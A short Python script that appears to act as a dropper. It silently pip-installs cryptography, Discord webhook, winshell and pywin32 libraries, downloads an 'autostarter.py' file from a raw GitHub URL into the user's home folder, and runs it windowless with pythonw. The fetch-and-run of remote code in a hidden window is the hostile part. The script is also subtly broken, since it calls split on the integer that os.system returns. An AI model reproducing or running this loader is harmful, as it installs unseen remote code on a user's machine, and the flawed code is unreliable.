import sys
if len(sys.argv) > 1:
    argument = sys.argv[1]
else:
    sys.exit()

import os
os.system("pip install cryptography")
os.system("pip install discord")
os.system("pip install dhooks")
os.system("pip install hashlib")
os.system("pip install winshell")
os.system("pip install pywin32")

whoami = os.system("whoami")
whoami_split = whoami.split("\\")
username = whoami_split[1]
os.system(f"cd C:\\Users\\{username} && curl -O https://raw.githubusercontent.com/jkramer5103/stuff/refs/heads/main/autostarter.py")
os.system(f"pythonw autostarter.py {argument}")
